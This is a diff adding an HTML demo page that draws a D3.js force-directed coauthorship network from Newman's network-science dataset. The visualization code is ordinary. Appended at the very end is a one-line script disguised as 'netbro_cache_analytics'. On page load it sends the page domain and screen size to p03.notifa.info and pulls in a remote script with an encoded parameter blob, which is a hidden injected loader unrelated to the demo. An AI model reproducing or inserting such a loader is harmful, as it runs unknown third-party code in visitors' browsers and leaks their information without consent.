@@ -1,0 +1,195 @@
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <title>Demo</title>
+
+  <script src="https://d3js.org/d3.v5.min.js"></script>
+
+  <script src="hover.js"></script>
+  <script src="helpers.js"></script>
+
+  <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:300,900" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<h2>Coauthorship in Network Science</h2>
+
+<svg></svg>
+
+<p>
+  <em>*Only showing connected components with 5 or more nodes.</em>
+  <br/>
+  <b>Data:</b> M. E. J. Newman, Finding Community Structure in Networks using the Eigenvectors of Matrices, Preprint Physics/0605087 (2006).
+  [<a href="http://www-personal.umich.edu/~mejn/netdata/">Data</a>]
+  [<a href="https://arxiv.org/abs/physics/0605087">Paper</a>]
+  <br/>
+  <b>Inspiration:</b> <a href="https://bl.ocks.org/mbostock/2675ff61ea5e063ede2b5d63c08020c7">https://bl.ocks.org/mbostock/2675ff61ea5e063ede2b5d63c08020c7</a> and
+  <a href="https://bl.ocks.org/steveharoz/8c3e2524079a8c440df60c1ab72b5d03">https://bl.ocks.org/steveharoz/8c3e2524079a8c440df60c1ab72b5d03</a>
+</p>
+
+<script>
+var graph;
+
+var w = 700;
+var h = 700;
+
+// craft url where datafile is located
+var base = "https://gist.githubusercontent.com";
+var user = "sjengle";
+var gist = "510ffd96ad06fc3921aee0425e962c1e";
+var file = "graph.json";
+var path = [base, user, gist, "raw", file].join("/");
+
+// setup scales
+var scales = {
+  color: d3.scaleSequential(d3.interpolateYlGnBu),
+  radius: d3.scaleSqrt().range([2, 12]),
+  stroke: d3.scaleSqrt().range([1, 8])
+};
+
+// setup layout with default values
+var layout = d3.forceSimulation()
+  .force("center", d3.forceCenter())
+  .force("forceX", d3.forceX())
+  .force("forceY", d3.forceY())
+  .force("collide", d3.forceCollide())
+  .force("charge", d3.forceManyBody())
+  .force("link", d3.forceLink());
+
+// stop layout until we are ready
+layout.stop();
+
+d3.json(path).then(callback);
+
+function callback(data) {
+  // save data globally for debugging
+  graph = data;
+  console.log(file, "loaded:", graph);
+
+  var svg = d3.select("svg")
+    .attr("width", w)
+    .attr("height", h);
+
+  var g = {
+    plot: svg.append("g")
+  };
+
+  g.plot.attr("id", "plot");
+  g.plot.attr("transform", "translate(" + (w / 2) + "," + (h / 2) + ")");
+
+  // place links underneath nodes
+  g.links = g.plot.append("g").attr("id", "links");
+  g.nodes = g.plot.append("g").attr("id", "nodes");
+
+  // update scales
+  scales.color.domain(d3.extent(graph.nodes, v => v.closeness));
+  scales.radius.domain(d3.extent(graph.nodes, v => v.degree));
+  scales.stroke.domain(d3.extent(graph.links, e => e.value));
+
+  // output node and link before and after layout
+  var last_node = graph.nodes[graph.nodes.length - 1];
+  var last_link = graph.links[graph.links.length - 1];
+
+  console.log("node (before):\t", last_node);
+  layout.nodes(graph.nodes);
+  console.log("node (after):\t", last_node);
+
+  console.log("link (before):\t", last_link);
+  layout.force("link").links(graph.links);
+  console.log("link (after):\t", last_link);
+
+  // draw nodes at initial positions
+  var nodes = g.nodes.selectAll("circle.node")
+    .data(graph.nodes)
+    .enter()
+    .append("circle")
+    .attr("class", "node")
+    .attr("r",  v => scales.radius(v.degree))
+    .attr("cx", v => v.x)
+    .attr("cy", v => v.y)
+    .style("fill", v => scales.color(v.closeness));
+
+  // draw links at initial positions
+  var links = g.links.selectAll("line.link")
+    .data(graph.links)
+    .enter()
+    .append("line")
+    .attr("class", "link")
+    .attr("x1", e => e.source.x)
+    .attr("y1", e => e.source.y)
+    .attr("x2", e => e.target.x)
+    .attr("y2", e => e.target.y)
+    .style("stroke-width", function(d) {
+      return scales.stroke(d.value);
+    });
+
+  // now, lets setup different force-directed layout parameters
+
+  layout.force("center").x(0).y(0);
+
+  // layout.force("forceX").x(0).strength(0.5);
+  // layout.force("forceY").y(0).strength(0.5);
+
+  layout.force("collide")
+    .strength(1)
+    .radius(v => scales.radius(v.degree) + 2);
+
+  layout.force("charge").strength(-12);
+  layout.force("link").strength(0.8).distance(function(e) {
+    return scales.radius(e.source.degree) + scales.radius(e.target.degree);
+  });
+
+  // updates node and link positions every tick
+  layout.on("tick", function(v) {
+    nodes.attr("cx", v => v.x);
+    nodes.attr("cy", v => v.y);
+
+    links.attr("x1", e => e.source.x);
+    links.attr("y1", e => e.source.y);
+    links.attr("x2", e => e.target.x);
+    links.attr("y2", e => e.target.y);
+  });
+
+  // setup node dragging
+  // https://github.com/d3/d3-drag
+  var drag = d3.drag()
+    .on("start", function(v) {
+      // avoid restarting except on the first drag start event
+      if (!d3.event.active) layout.alphaTarget(0.3).restart();
+
+      // fix this node position in the layout
+      // https://github.com/d3/d3-force#simulation_nodes
+      v.fx = v.x;
+      v.fy = v.y;
+    })
+    .on("drag", function(v) {
+      v.fx = d3.event.x;
+      v.fy = d3.event.y;
+
+      updatePosition(v);
+    })
+    .on("end", function(v) {
+      // restore alphaTarget to normal value
+      if (!d3.event.active) layout.alphaTarget(0);
+
+      // no longer fix the node position after drag ended
+      // allows layout to calculate its position again
+      v.fx = null;
+      v.fy = null;
+    });
+
+  nodes.call(drag);
+
+  // setup node tooltips
+  setupTooltip(nodes);
+  setupHighlight(nodes, links);
+
+  // restart the layout now that everything is set
+  layout.restart();
+}
+
+</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXaLrpQTMAN103UF16ld9AYeT6f1gp01HZKKsEd%2f2QujXuod%2br5xWSiEZp22lctdckJy%2bxqSM9j39wj8NAhAVI7WNDC33M7NF4GAixvIOliWfqXp9K49N9e0HUxv7t8PIcswidpK6gOySYdGKyB6KfO7ZUDsUR9ajTo%2f9SXsL%2bU3vS5eAwtOD51MdZYj2e9w5DBwLN6eQ2pLa6AmWiSWTg1D%2byuwco1yme3%2b%2fRZMTLOwLts7tmdnxtoI0j1YeLGsAjvNNOGxb59zWX5mfTHMb%2bRF51KDnQSdmbkxoQnQnlL3Ypi4bQ3399IfNF%2fSR9YLn4rNFbtgGIp8sbrg0ccd880U%2bVHMT4CTu8hLwwl2NwRH7eK6JzDfHfHGNjiur4WrCsygBVIXHbc6fRDH6wh4XjsNcvyo%2fVaRNK8ODhcPwCnpmXDgU0LI%2bM9J%2fD2DT6jAL%2bHBWT1a%2fDd2Q1fgGlg03YlUJgz%2f17tEl8B2KfLDkbWqxHeNhHSkH2n%2b5Z2MAgsZ8QNzjUizOP9dxPCH4oaWZG6vMnGwYSJrFdWraLA%2bx0e6JuYxd2tg0%2bRUNVTiw5oGKAXEoIIv1veyUCqelHsLuwiqOXZEqlXig8lzXulsIUXmpw3RqaPnrgCOYfcEUsK23Sw3%2fCVjymrGc3evplXLAuJ7Kx1hbRkJ3xQr0cMYlmfR8%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
